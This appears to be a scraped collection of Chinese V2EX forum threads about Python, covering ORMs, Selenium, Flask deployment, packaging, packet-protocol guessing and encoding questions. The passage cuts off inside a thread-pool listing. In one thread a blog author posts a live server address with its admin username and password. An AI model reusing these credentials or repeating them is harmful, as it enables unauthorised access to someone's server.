"\r", "要记得，优化好了的 ORM 总是不如优化好了的 SQL 纯净语句。我曾经为了这个动了些脑筋。", " Python 就应该统一起来。驼峰风格学习下 Java 什么的语言。这样大家都能迅速读懂。\r", "可惜 python 的很多库写手，也许喝了瓶酒，写库的时候，命名非常不规范，反正发布了，能 work 就行。但是如果是大公司发布标准库的话，应该注意很多。\r", "当然当年的 MS 的很多库命名也十分令人蛋疼。", " 2333 其实质量比较差的是标准库。。", "你们好像忽略了 java 上的 orm 。。基本都得手写 sql ，也就是查询结果能映射一下。\r", "\r", "优点是数据库特性支持的很好（废话），缺点是需要较高的 sql 功底。", "我有个问题 大家看看对不对：\r", "用 orm 的主要优势是能保证各中平台 python javascript 的语法一致性， 不用学习不同 lib 比如 pymongo mongoose 的不同 api"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>urllib2.URLError: &lt;urlopen error [Errno 10061] &gt;\n经常会返回这样的错误\n网上大多是 IE 取消代理，可是机器的 IE 本来就没勾选\n这个怎么解决</p>\n<pre><code>try:\n    driver.get(url)\n    time.sleep(random.randint(10,15))\nexcept:\n    driver.close()\n</code></pre>\n</div></div>"], "reply": "1", "tittle": "使用 selenium 操作 chrome 的问题", "comment": ["url 能不能打开？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>由于 python 程序中需要登录操作所以在一个函数中通过以下方式启用了 cookies ：</p>\n<pre><code>cj = cookielib.CookieJar()\nopener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))\nurllib2.install_opener(opener)\n</code></pre>\n<p>但是登录完成后其他的一些操作不再需要 cookies 了，而且 cookies 越少越好，所以我想再禁用了它，该如何操作呢</p>\n</div></div>"], "reply": "5", "tittle": "Python 中如何禁用 cookies", "comment": ["遇到这种用 urllib/urllib2 的情形，永远推荐 requests.", "别 install_opener 嘛，需要 cookie 的时候用 opemer ，不需要的时候直接用 urllib2.urlopen 。\r", "用 requests 也差不多，需要的时候用 session ，不需要的时候直接用 requests.get 。", "不知道如何禁用 cookies ，不过你确定登录完成后就不需要 cookie 了么，那么登录状态是如何保存的呢？", "你不写 cookie ，或者请求的时候不发 cookie 不就行了", " 登录上执行完想要的操作（这步需要 cookies ）后就不需要登录状态了，后面的操作需要 cookies 越少越好"]},
{"content": ["<div class=\"topic_content\">一直在学习 python ，期间了解过 javascript 和 golang ，就社区而言，感觉 python 貌似不火啊，社区人气都比较低。反观 cnode 、 golang 中国就人气高很多。感觉 Beego.me 中的产品案例很不错，都是开发者提交的 demo ，初学者可以参照学习。无意挑起 XX 的 XX 之争，只是探讨而已。</div>", "<div class=\"topic_content\">感谢大家的回复，一些回复很有帮助。\r<br>1 、可能是 python 擅长的领域确实不在互联网，所以给人造成了人气较低的感觉。只是初学者在入门了一门语言后，能够实践的小项目也就是一个 web 或一个 app 。\r<br>2 、有人觉得“你是看哪个语言火就学哪个语言吗”。当然不是这样，只是在学习的时候希望有很多小项目去实践，在寻找小项目的过程中就会发现某个社区人气高、某个社区人气低。\r<br>3 、任何一门语言的顶级大牛肯定不会关心火不火的问题。不要总是以大牛说事，大牛也是从小白变得。\r<br>4 、再次强调，不是引战贴。本人觉得 XX 是最好的 XX 很是无聊。苍老师很出名，但是我没看过一部她的片子。</div>"], "reply": "63", "tittle": "就社区而言，感觉 Python 貌似不火啊", "comment": ["python 很火啊", "那你说哪个火", "这里的 python 节点还是挺热的\r", "\r", "嘿 年前申请了一下 python cn 的邮件列表还被据了 也是无语了", "别的我不知道啊 在智联 拉勾等各大招聘平台 java 和 PHP 绝对比 python 火", "人生苦短，我还是坚持 python ～", "肯定不火啊，毕竟 php 才是最好的语言。", "python 在大数据 这部分还是比较火的Ⅷ", "1.python 火的领域不是在互联网 2.python 在互联网领域确实不如 php ， java 火，就酱，但是 python 一直作为一种逼格一种信仰活在很多“ geek ”程序员心中", "v2ex 就是 py 交易社区呀", "小扎用两种语言， php 和 python...你说它火不", "不要认为计 IT 行业==互联网行业。", "国内针对某种开发语言的社区，好一点的也就 ruby china 了吧", "也就 ruby china 和 cnodejs 了", "python 没 go 火？就 v2 社区而言？", "golang 是真不火", "别看中文社区", " 说到点上了，得看英语圈子", "python 火的时间，只怕比 v2 里很多人岁数都要大。。。", "你看看 V2EX 讨论 python 的热度，这还叫不火啊，我觉得这个网站不应该叫 V2EX ，应该叫 V2Python", "你说这话容易挨揍你知道吗？", "幸存者偏差", " iP2EX", "大学时 python 是专业必修课，上班后身边全是用 python 的人……", " python 国内开始火好像是 GAE 出来那会吧。", "当年 perl 真火", "最近好多引战帖", "rust 是哑了火", "群主的感觉是对的， py 找工作都难", "资料太多， 技术成型后都这样的。\r", "就大陆来说\r", "当年比较火的 python 社区是 python-cn 邮件列表、啄木鸟， 后来多个 douban python 组, 俱往矣\r", "当年比较火的 php 社区是新浪 php 论坛、 phpe 、 phpx ， 俱往矣, phpchina 当年不怎么火， 但是和康盛有 py 关系， 搭上 discuz!免费时的东风， 又搭上 zend 搞代理认证, 又碰上 php 框架井喷， 才续了一把命\r", "当年比较火的 ruby 社区(rails 社区?)是 javaeye 、 chinaonrails ， 俱往矣， ruby-china 算后起， 但就现在的用户参与度其实也没办法和三四年前初创时比\r", "还有综合一点的有 linuxsir 、 chinuaunix 、 freebsdchina ， 也俱往矣", "golang 人气高吗 ？", "楼主看到真相了  python 有点过气网红的意思", "今天说这个火明天说那个火，真没意思，我只想说顶尖的 py 一直是供不应求的", "Python 国外玩的搞大数据分析、科学计算，那个领域基本就没 php ， java 什么事儿。在国内火不火的直观感觉只是 Web 和 App ， Python 在 Web 、爬虫方面一样不差， Java 要不是安卓崛起，也可以进敬老院啦", "你感觉错了 : (", "其实最火的应该是 JavaScript, 各种框架要疯了", "AI Insight ： Python 为何能坐稳 AI 时代头牌语言\r", "目前国内使用人数比不上 java 或者前端那些", "不是不火吧，而是比较分散， scrapy ， flask ， django ， tensorflow 之类的都有自己的社区，不会都混在 python 社区里", "python 在数据分析和科学计算里也是蛮火的，但我估计大部分人都直接去 stackoverflow 了，而且这些人并不是程序猿。", "机器学习的第一语言不为过吧", "感觉还好啊，讨论人挺多的", " 大数据分析没 Java 的事？", "09 年申请进 python-cn 列表好像不太难啊...", " 过了", " 大数据基本上都是 jvm based 。 python api 都是二等公民", " 我都是这些网站的会员 55555\r", "\r", "python 高人一般在\r", "\r", "列表 > 自由天空 > v2ex", "就互联网来说，的确不怎么火， php 、 js 都比 py 火。", "一般 Python 在老司机社区火，写个爬虫抓个片子啥的 （逃", "也就这两年吧， js 比较火，所以前端讨论的最多。\r", "前两年刚来这论坛的时候， python 可是最热门的，第一语言。\r", "没记错的话，这个论坛就是 python 编写的。", "python 好像没有像 ruby-china lavarel-china 这样的社区论坛", "不要怕，人工智能是 python 的天下，会越来越火的", "某种意义上来说，反而凸显 Python 的文档更加的优越？大家都不需要讨论，单看文档就够了", " 有 python-cn 的。不过是邮件列表。 90 都不会用。", " 有道理", "为什么要用火与否来评价编程语言？我用 C 、 C++多，因为喜欢使用并研究 linux ，其底层都是 C 写的，也学习 3D 游戏引擎，其大多是 C++写的， C 、 C++火？不火？。家里有块菜地，因此有铁锄，办公室打字，因此有键盘，铁锄、键盘那个火呢？", " 感觉这两年 python-cn 邮件列表比以前冷清多了 可能是 python 确实也没有以前那么热了,一方面墙导致少有新人加入", "要入门 python ，可以去 kaggle ，也可以在那里和大牛交流。。", "python 区被楼主这样生生的弄火了", "  不好加吧。审核都不通过。", "\r", "\r", "看排行还是很出乎意料的。感觉 Python 在数据挖掘领域和非计算机科研领域比较流行。", "怀念 python-cn 邮件列表还活跃的时候。", "我印象当初 V2EX 就是个 python 社区。", "最近接触的  深度学习 ， ROS"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 manager 启动应用一切正常：\npython <a href=\"http://manage.py\" rel=\"nofollow\">manage.py</a> runserver --host 0.0.0.0\n上传的 csv 文件都能正常写入 sqlite 数据库</p>\n<p>使用 uwsgi+supervisor 部署之后：\nservice supervisor start\n上传 csv 文件到服务器，写入数据库时只能写一条数据，然后就显示内部错误 500 ， log 文件里面也找不到原因，现在问题应该就出在 uWSGI 和 supervisor 上</p>\n<p>配置参考： <a href=\"http://www.jianshu.com/p/84978157c785\" rel=\"nofollow\">http://www.jianshu.com/p/84978157c785</a></p>\n<p>哪位 v 友大神帮忙分析一下问题出在哪</p>\n</div></div>", "<div class=\"topic_content\">换成 gunicorn 只有已解决问题。多谢大家的回复。</div>"], "reply": "19", "tittle": "为啥 Flask+uwsgi 部署应用后，只读取一条 CSV 记录就崩溃？", "comment": ["我要是没记错， uwsgi 对每个 request 的相响应时间（ python 程序的执行时间）是有要求的，超时就很容易被 kill 掉，不知道你的问题和这个有没有关系", " 可能性比较大，因为需要调用第三方 API 进行数据查询，然后再写入数据库，所以耗时比较长。这个时间要在哪里设置呢？", "去看 uwsgi(如果有的话)和 supervisor 的 log 文件", "初期不建议直接 supervisor, 用 uwsgi --ini  你的 uwsgi ini 等配置文件 直接看到输出以定位问题", " uwsgi ini 文件有配置 log 输出，但是没有看到异常\r", "开 debug 直接运行看输出，还不行就上单步调试。", "哦，看错了。我建议是用其他运行方式都跑一下，看能不能重现。\r", "另外用 supervisor 的话， log 会在 stderr 里面，不在 stdout ，你可以两个都看一下，可能只是我这样。\r", "\r", "stderr_logfile=/path/to/stderr.log", " 我看 stackoverflow 上面有人说，是因为没有关闭 session ？\r", "\r", ".teardown_request\r", "def shutdown_session(exception=None):\r", "    from extension import db\r", "    db.session.remove()", " 但是这个不能解释为什么开发环境下没问题吧", "嗯。。。 ", " 对啊", "如果是开发环境没问题但是 uwsgi 部署后有问题的话，你是不是在返回 response 之前开了一个新线程？", "换 gunicorn 试试，随便换换，修好了再研究为什么", "flask + gunicorn 坑少", " 说不定是你上传的文件超过了 uwsgi 的限制，参考下这个 ", "\r", "\r", "也有可能是超过了 Nginx 的限制。", " nginx 都没用，只用了 uwsgi 和 supervisor", " \r", "\r", " \r", " \r", "\r", "换成 gunicorn 后已解决全部问题。说明 uWSGI 是个坑啊。", " uwsgi 不坑\r", "gunicorn 默认是 fork （我没记错的话），前面记得套 nginx\r", "uwsgi 默认是多线程，说明你有 bug 没处理好\r", "fork 因为内存隔离，可以掩盖很多 bug\r", "\r", "我建议你试试 gunicorn 不是希望你用 gunicorn “解决问题”\r", "问题还在\r", "你现在应该以 gunicorn 为起点，逐溅缩小和 uwsgi 的区别，定位问题\r", "比如 gunicorn 也可以多线程或者用协程\r", "uwsgi 也可以多进程", " 多谢指点。业余选手暂时还不能完全理解你说的这些，慢慢体会。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，卡在第一行。\n然后 CPU 跑满 25%,2 个小时不动。醉了。</p>\n</div></div>"], "reply": "4", "tittle": "Python 用 py2exe 编译，卡在 running py2exe，求解。", "comment": ["2 ？ 3 ？\r", "\r", "--------\r", "\r", "系统 xp x86\r", "python 版本 python3 \r", "\r", "pip install pypiwin32\r", "\r", "pip install pyinstaller\r", "\r", "\r", "打包 exe 命令\r", "pyinstaller -F -w -i manage.ico app.py\r", "\r", "-F ：打包为单文件\r", "-w ： Windows 程序，不显示命令行窗口\r", "-i ：是程序图标， app.py 是你要打包的 py 文件\r", "\r", " \r", "本人在这样的环境下使用， NO Problam", "打包脚本发一下看看", "感谢诸位。问题已经自我解决。 ", " 是我的版本太高。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>协议 A REQUEST = { 0xDD, 0x07, 0xF0, 0x00, 0x00, 0x00, 0x1D, 0x4F, 0x00, 0x00, 0x2C, 0x00, 0x36, 0x31, 0x37, 0x36, 0x33, 0x30, 0x35, 0x39, 0x32, 0x30, 0x3D, 0x31, 0x3D, 0x30, 0x3D, 0x30, 0x3D, 0x30, 0x3D, 0x35, 0x30, 0x33, 0x39, 0x37, 0x2E, 0x33, 0x36, 0x37, 0x3D, 0x34, 0x33, 0x30, 0x32, 0x36, 0x37, 0x33, 0x33, 0x36, 0x30, 0x3D, 0x3D, 0x30, 0x3D, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6D, 0x8F, 0x41, 0x1B, 0x3E, 0x97, 0xCD, 0x3A, 0x52, 0x96, 0x89, 0x84, 0xA3, 0x37, 0x2A, 0xCF, 0x36, 0x77, 0x7F, 0xCB, 0x46, 0xA2, 0xAA, 0x65, 0xD3, 0x95, 0x68, 0x2C, 0x42, 0x30, 0x6B, 0xD5, 0xA7, 0xA5, 0x20, 0x1B, 0xE3, 0x5F, 0xE4, 0x95, 0xAE, 0x7C, 0x89, 0xA5, 0xD7, 0x87, 0xE9, 0xF5, 0x9C, 0x8E, 0x3B, 0x1C, 0x86, 0x31, 0x6F, 0x1E, 0xCE, 0xDB, 0x2D, 0x0C, 0x75, 0x44, 0x8B, 0x4E, 0x96, 0xEF, 0xF0, 0x6F, 0x3F, 0x8A, 0x98, 0xBB, 0x25, 0x78, 0x7E, 0xD1, 0x44, 0xFA, 0x22, 0xB8, 0x47, 0x5D, 0xAA, 0x56, 0x1D, 0xCD, 0x50, 0x45, 0x95, 0x46, 0x30, 0x71, 0x73, 0x91, 0xE0, 0x65, 0x4D, 0x92, 0xCB, 0xF2, 0x32, 0xD1, 0x37, 0x3D, 0x5C, 0xAC, 0x92, 0xC0, 0xD4, 0xE9, 0xE5, 0x95, 0xBC, 0xA4, 0xFF, 0x50, 0x07, 0xD7, 0x52, 0x9B, 0x2A, 0x71, 0x5A, 0xA2, 0x06, 0x6F, 0xD8, 0x43, 0x92, 0xEE, 0x00, 0xC6, 0x2A, 0x93, 0x49, 0xF2, 0xC1, 0x28, 0x35, 0x00, 0xDD, 0x0C, 0xB5, 0x40, 0x40, 0xE5, 0xE4, 0x16, 0x29, 0x4C, 0x87, 0x20, 0xCA, 0xD3, 0x65, 0x51, 0x3C, 0x99, 0xD3, 0x1C, 0x23, 0x7E, 0x1C, 0x6C, 0x5A, 0xA5, 0xB6, 0x47, 0xD4, 0x38, 0x7D, 0x2B, 0xB7, 0x32, 0x86, 0x87, 0xD6, 0x4E, 0x36, 0x81, 0xD3, 0x0D, 0xA6, 0x9A };</p>\n<p>协议 A RESPONSE = { 0xDD, 0x07, 0xB1, 0x00, 0x00, 0x00, 0x1D, 0x4F, 0x02, 0x00, 0x2C, 0x00, 0x36, 0x31, 0x37, 0x36, 0x33, 0x30, 0x35, 0x39, 0x32, 0x30, 0x3D, 0x31, 0x3D, 0x30, 0x3D, 0x30, 0x3D, 0x30, 0x3D, 0x35, 0x30, 0x33, 0x39, 0x37, 0x2E, 0x33, 0x36, 0x37, 0x3D, 0x34, 0x33, 0x30, 0x32, 0x36, 0x37, 0x33, 0x33, 0x36, 0x30, 0x3D, 0x3D, 0x30, 0x3D, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x39, 0x5D, 0xB1, 0x89, 0x7A, 0x85, 0x64, 0xE5, 0xD8, 0xD1, 0xDD, 0x7E, 0x43, 0x4A, 0x5A, 0xBF, 0x4F, 0x36, 0x9F, 0x14, 0x49, 0xF8, 0xFB, 0x77, 0xE0, 0xAD, 0x4F, 0x3C, 0x34, 0x20, 0xBB, 0x2D, 0xDB, 0xB6, 0xD2, 0xCA, 0xF9, 0x46, 0x48, 0x3B, 0xFD, 0xDB, 0x27, 0xA2, 0x3A, 0xC7, 0x96, 0xC6, 0x91, 0xCA, 0xC5, 0x48, 0xBC, 0xA2, 0xF0, 0x34, 0xDB, 0x8E, 0xCE, 0x61, 0xF4, 0xBA, 0x0D, 0x9D, 0x25, 0xED, 0xB4, 0x9B, 0x74, 0xE6, 0xDA, 0x0F, 0x04, 0xCF, 0x1C, 0x35, 0x98, 0xDE, 0x73, 0x7D, 0x68, 0x55, 0xB1, 0xFB, 0x39, 0xA4, 0x78, 0x9B, 0x00, 0x5A, 0xF4, 0x45, 0x36, 0x35, 0x84, 0xDC, 0x30, 0x82, 0x12, 0x83, 0x7B, 0x32, 0xB3, 0x15, 0x4A, 0x42, 0xEF, 0xA0, 0x8F, 0x03, 0x51, 0x0D, 0xD6, 0x89, 0x64, 0x74, 0x12, 0x5F, 0x2C, 0x3C, 0xAE };</p>\n<p>协议 B REQUEST = { 0xDD, 0x07, 0xE0, 0x00, 0x00, 0x00, 0x14, 0xA4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE7, 0xAF, 0xCC, 0x48, 0x1F, 0xDA, 0x4A, 0xC7, 0xEB, 0xC9, 0x81, 0xF2, 0xE3, 0x13, 0x55, 0x5A, 0xE6, 0x57, 0xC3, 0x78, 0x5A, 0x02, 0xF2, 0x09, 0x59, 0x1B, 0x1D, 0x63, 0x6F, 0x82, 0xD6, 0xAE, 0xB1, 0x04, 0xB3, 0x7A, 0x37, 0x13, 0x88, 0x2B, 0x90, 0x75, 0xF2, 0x46, 0xAD, 0xF4, 0xE0, 0xF7, 0xDF, 0xCE, 0x7E, 0x03, 0x17, 0x39, 0xAE, 0xB0, 0xC1, 0xCB, 0x2E, 0xD4, 0xC8, 0xDD, 0x7F, 0x16, 0x70, 0xC3, 0xFE, 0x48, 0xC4, 0x36, 0x0C, 0xA4, 0x6B, 0xD7, 0x65, 0x5D, 0xB7, 0x00, 0xFA, 0xE5, 0x76, 0x9A, 0x2B, 0x9C, 0xF7, 0xE1, 0xBC, 0xA3, 0xFF, 0x17, 0x98, 0x26, 0xC7, 0x39, 0x0B, 0xFD, 0x2D, 0xB7, 0x81, 0xDB, 0x07, 0x59, 0x82, 0x4E, 0x16, 0x17, 0xB1, 0xFB, 0xB9, 0xEB, 0xA9, 0xC7, 0xCD, 0x0C, 0x6D, 0x4A, 0x16, 0x81, 0x2F, 0x3B, 0xB0, 0xE4, 0xAC, 0x54, 0x18, 0xB8, 0x6B, 0x65, 0x40, 0x84, 0x27, 0xCF, 0x1E, 0x19, 0xD1, 0x0B, 0x09, 0x55, 0x33, 0xC7, 0xB6, 0x66, 0x99, 0xD7, 0x2B, 0x4C, 0xE1, 0x1D, 0xA9, 0x74, 0x4D, 0xB7, 0x01, 0x5A, 0x77, 0xA6, 0x31, 0xED, 0x1A, 0xF4, 0x4F, 0x45, 0x6D, 0x7D, 0xA1, 0xF1, 0xD2, 0xE8, 0xEC, 0xCC, 0x68, 0xF7, 0x6E, 0x23, 0x30, 0x0D, 0xAD, 0x57, 0x06, 0xB9, 0xC3, 0xFF, 0x0C, 0xE5, 0x78, 0xF7, 0x9A, 0xC4, 0xDB, 0x83, 0xD5, 0x52, 0xF9, 0xFA, 0x26, 0x7B, 0xF4, 0x17, 0xDA, 0x83, 0x97, 0x60, 0x5F, 0xDB, 0x5F, 0x21, 0x2C, 0x15, 0x33, 0xD9, 0xDE, 0x1D };</p>\n<p>协议 B RESPONSE = { 0xDD, 0x07, 0x45, 0x00, 0x00, 0x00, 0x14, 0xA4, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x29, 0xEA, 0xC2, 0x2A, 0xF8, 0x5E, 0xF2, 0xF2, 0xEF, 0x75, 0xA3, 0x2B, 0x9B, 0x60, 0x04, 0xA5, 0x93, 0xD3, 0xBD, 0xC3, 0x6A, 0x02, 0x6D, 0x16, 0xB0, 0x2F, 0xCC, 0x99, 0xDB, 0x25, 0x1A, 0xC3, 0xFB, 0x32, 0x98, 0x47, 0x30, 0xFF, 0x6D, 0xB5, 0x7C, 0x93, 0xD9, 0x88, 0x52, 0x8A, 0xB9, 0x55, 0x87, 0xE6, 0xB5, 0xF5, 0x17, 0xC1, 0x91, 0x55, 0x96 };</p>\n<p>已经分析：0XDD07应该是头FLAG，接下来四个字节是后续数据长度，小端表示形式</p>\n</div></div>"], "reply": "13", "tittle": "求问，抓包某个 APP 协议， HTTP， BODY 为二进制式加密，求下思路", "comment": ["我觉得这个东西，发到看雪可能会得到更好的帮助", "逆向 app 啊", "擦，自定义协议 udp 或 tcp 通讯的啊，嵌入式上常用", "这个破解有难度，有文档都要仔细去看", "搜 magic signature ，估计是某个 stream compression 算法", "不逆向搞不出来，没有人直接看包就能分析的。", "包里的数据肯定跟你的应用有关", "这些数据也许上帝知道含义吧。", "给一组数据包想逆出协议，连 app 环境都没，怎么分析", "android 的话上 xposed hook 试试，还有只有一个包的话基本没办法分析的。", "记得 N 年前 V2 有个一样的帖子\r", "当时的那个答案是: content-encoding:gzip", "腾讯相关 APP 的包。包体已经加密过的了。协商密钥的部分这几个没有，加密部分解不出来的。", "瞎猜一下：\r", "DD 07 // header flag\r", "F0 00 00 00 //  type short int ,body length = 240\r", "1D 4F // type short ,flag\r", "00 00  // type short\r", "2C 00  // type short , header length = 44\r", "36 31 37 36 33 30 35 39 32 30 3D 31 3D 30 3D 30 3D 30 3D 35 30 33 39 37 2E 33 36 37 3D 34 33 30 32 36 37 33 33 36 30 3D 3D 30 3D 30 (length = 44,str=\"6176305920=1=0=0=0=50397.367=4302673360==0=0\")\r", "00 00 00 00  // int \r", "00 00  // short\r", "\r", "// encrypted body \r", "6D 8F 41 1B 3E 97 CD 3A 52 96 89 84 A3 37 2A CF 36 77 7F CB 46 A2 AA 65 D3 95 68 2C 42 30 6B D5 A7 A5 20 1B E3 5F E4 95 AE 7C 89 A5 D7 87 E9 F5 9C 8E 3B 1C 86 31 6F 1E CE DB 2D 0C 75 44 8B 4E 96 EF F0 6F 3F 8A 98 BB 25 78 7E D1 44 FA 22 B8 47 5D AA 56 1D CD 50 45 95 46 30 71 73 91 E0 65 4D 92 CB F2 32 D1 37 3D 5C AC 92 C0 D4 E9 E5 95 BC A4 FF 50 07 D7 52 9B 2A 71 5A A2 06 6F D8 43 92 EE 00 C6 2A 93 49 F2 C1 28 35 00 DD 0C B5 40 40 E5 E4 16 29 4C 87 20 CA D3 65 51 3C 99 D3 1C 23 7E 1C 6C 5A A5 B6 47 D4 38 7D 2B B7 32 86 87 D6 4E 36 81 D3 0D A6 9A", "密钥变化滚动的，无法解析"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>起源：之前一直用 [有道云笔记] 来记录 Python 相关的知识，它的全局搜索功能太好用了，现在刚好学到 Django ，所以就写了这个 blog= =，用于搜集好用的，实用的代码段，欢迎各路大神点评和推荐代码段</p>\n<p>线上地址： http://119.29.59.93:8000/\nGithub 地址： <a href=\"https://github.com/ns2250225/DjangoBlog\" rel=\"nofollow\">https://github.com/ns2250225/DjangoBlog</a></p>\n</div></div>"], "reply": "16", "tittle": "基于 Django 的个人小博客", "comment": ["安全提醒: django 线上部署请务必关闭 DEBUG 选项, 否则可能导致任意代码执行", "后台账号： mok\r", "后台密码： 1a2b3c4d", " 卧槽", " 怎么啦？", " 我还以为被黑了，= =！原来是你自己公布的", " 感谢提醒，现在就去关闭 DEBUG ，等下再测试", " 现在管理员账号信息被清空了= =，怎样做到的啊", "是登录不是登陆", " 你这样说。我想起了我的大学测试课程的老师。 h   h", "登录", " 嗯，改过来了", "然而我并没有发现有什么优点？？", " 能给一些具体的建议吗，本人最近才入坑 Django ，谢谢", " 看看 python 学习小组是怎么构建博客的，简书上有他们的文章", "楼主，你界面怎么写的这么 6 啊。。。", " Python 学习小组是哪的？没搜到呢？能否给个地址"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>想实现一个参数聚类的方法, 分析出参数都是什么数据类型(int, string, float, double)，<br>\nPython 内置提供的功能有限，而且暂时不考虑直接采用正则。</p>\n<p>最终想要的结果，给出参数，得出数据类型路径</p>\n<pre><code>c = '/buy/12333/price/2.00' \nstructure = '/str/int/str/float' \n</code></pre>\n<p>python 只支持最基础的数据类型，现在实现是通过硬编码一个一个的字符带入到 curses.ascii 内置的函数做检测，感觉有点笨，不知道外面有没有已经造好的第三方库。</p>\n<pre><code>a = '3.14'\nprint a.isalpha()\nprint a.isdigit()\nprint a.isalnum()\nb = '/admin/login.php'\nc = '/read/12333/'\ne = '/t/id/12333/'\n</code></pre>\n<p>isInt(), isFloat(),  不存在。。。</p>\n<pre><code>&lt;?php\n$var = filter_var('0755', FILTER_VALIDATE_INT, $options);\nvar_dump(filter_var('bob@example.com', FILTER_VALIDATE_EMAIL));\nvar_dump(filter_var('http://example.com', FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED));\n</code></pre>\n</div></div>"], "reply": "9", "tittle": "咨询: Python 有类似 PHP 的 filter_var 函数或者第三库吗?", "comment": ["最终想要的结果，给出参数，得出数据类型路径\r", "\r", "```python\r", "c = '/buy/12333/price/2.00'\r", "structure = '/str/int/str/float'\r", "```", "isinstance", " \r", "恩，尝试过这种方法, 要强转之后，才能判断，默认传过去的是 str 类型\r", "\r", "a = '3.14'\r", "print isinstance(a, float)\r", "False\r", "print isinstance(float(a), float)\r", "True", "先把 str 强转成精度高的 float 类型，做 try catch 捕捉住 ValueError 错误\r", "然后用 float.is_integer()来判断数字是否是整形，解决的办法还是笨。", "有一个库叫 marshmallow ，在前段时间做 swagger 文档自动生成代码的时候使用过，用作验证类型还是很好使的，自定义空间也很大。", "接楼上\r", "![]( ", " 2j91cc9j20km02vq33)", " 2j91cc9j20km02vq33", "靠 X2\r"]},
{"content": ["<div class=\"topic_content\">（部署在 centos 上默认编码是 utf-8 ）通过 python 下载文件时，取得的 HTTP 头是以下：\r<br>Content-Encoding: none\r<br>Content-Disposition: attachment; filename=\"xxxxx\"\r<br>\r<br>提取 filename=后的 xxxxx 这个可能是英文，简体，繁体之类的，如果直接用这个文件名保存的话可能会出现乱码。\r<br>有没有一个靠谱的方法检测文件名编码，然后将它统一转换成 utf8?</div>"], "reply": "8", "tittle": "文件名的多语言编码如何统一转换成 utf-8", "comment": ["chardet", " 不好意思忘记说了，用 chardet 检测不是很靠谱，比如当遇到“無印良品”这几个字时就是以下结果，还有一些中文的会检测成 KOI8-R ，啥的。{'confidence': 0.31101204298947943, 'encoding': 'ISO-8859-2'}", " chardet 基于统计检测编码, 样本数不够(比如只有几个字)的时候要么检测不出来, 返回 None, 要么 confidence 很低, 除了基于统计, 目前没有任何有效的算法计算编码", " 谢谢！还想请教一下，比如某一个网站的文件下载，文件名的编码都是同一种的还是多种的？比如我测试的目标网站，纯中文的时候用 GB2312 可以解，比如“ MUJI 無印良品”这种文件名的时候又解不了，尝试用 UTF8 解也是乱码， 用这个 chardet 检测出 confidence 很低的某种不认识的编码。如果在 WIN 下跑的话，不处理文件名都能正常显示，那这文件名是啥编码能确定吗？", "如果你是从网页内容中提取文件名的, 试试用 chardet 检测整个网页的编码然后使用检测出的编码解码 filename=\"xxxxx\", 一般来讲, 比较规范的网站编码都是统一的, 看看你的浏览器正确显示时用的什么编码就知道了", " 非常感谢，按你这个思路问题似乎解决了。网页的是 GBK 的。我用 GBK 解都 OK 了，之前一开始就用 chardet 检测，结果有 GB2312 和其它各种编码，一直这个思路带歪了，没想到跟网页编码一致。（因为不是从网页内容提取文件名的，文件名是下载连接里的 HEADER 提取的）", "网页其实也是通过 http 头跟统计来确定编码的, 设计规范的网页都会在 header 里面标注页面编码, 这个信息可以被浏览器利用, 如果编码乱标, 浏览器拿着可能也是乱码, 你可以试试把本页面保存下来, 然后将 html 头的 charset 声明改成 charset=ascii, 然后打开看看会不会乱码;  如果编码缺失, 浏览器会通过某些统计算法来确定编码(像 chardet 一样), 可以将本页面的 charset=utf-8 声明删掉, 再打开看看", " 谢谢！明白了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code># -*- coding: UTF-8 -*-\nimport re\nimport sys\nimport threading\nimport traceback\nimport random\nimport time\nimport subprocess\nimport shlex\ntry:\n    import Queue            # Python 2\nexcept ImportError:\n    import queue as Queue   # Python 3\nclass NoResultsPending(Exception):\n    pass\n\nclass NoWorkersAvailable(Exception):\n    pass\ndef _handle_thread_exception(request, exc_info):\n    traceback.print_exception(*exc_info)\ndef makeRequests(callable_, args_list, callback=None,\n        exc_callback=_handle_thread_exception):\n    requests = []\n    for item in args_list:\n        if isinstance(item, tuple):\n            requests.append(\n                WorkRequest(callable_, item[0], item[1], callback=callback,\n                    exc_callback=exc_callback)\n            )\n        else:\n            requests.append(\n                WorkRequest(callable_, [item], None, callback=callback,\n                    exc_callback=exc_callback)\n            )\n    return requests\nclass WorkerThread(threading.Thread):\n    def __init__(self, requests_queue, results_queue, poll_timeout=5, **kwds):\n        threading.Thread.__init__(self, **kwds)\n        self.setDaemon(1)\n        self._requests_queue = requests_queue\n        self._results_queue = results_queue\n        self._poll_timeout = poll_timeout\n        self._dismissed = threading.Event()\n        self.start()\n    def run(self):\n        while True:\n            if self._dismissed.isSet():\n                # we are dismissed, break out of loop\n                break\n            try:\n                request = self._requests_queue.get(True, self._poll_timeout)\n            except Queue.Empty:\n                continue\n            except Exception as e:\n                pass\n            else:\n                if self._dismissed.isSet():\n                    self._requests_queue.put(request)\n                    break\n                try:\n                    result = request.callable(*request.args, **request.kwds)\n                    self._results_queue.put((request, result))\n                except:\n                    request.exception = True\n                    self._results_queue.put((request, sys.exc_info()))\n    def dismiss(self):\n        self._dismissed.set()\n\nclass WorkRequest:\n    def __init__(self, callable_, args=None, kwds=None, requestID=None,\n            callback=None, exc_callback=_handle_thread_exception):\n        if requestID is None:\n            self.requestID = id(self)\n        else:\n            try:\n                self.requestID = hash(requestID)\n            except TypeError:\n                raise TypeError(\"requestID must be hashable.\")\n        self.exception = False\n        self.callback = callback\n        self.exc_callback = exc_callback\n        self.callable = callable_\n        self.args = args or []\n        self.kwds = kwds or {}\n\n    def __str__(self):\n        return \"&lt;WorkRequest funname=%s id=%s args=%s kwargs=%s exception=%s&gt;\" % \\\n            (self.callable,self.requestID, self.args, self.kwds, 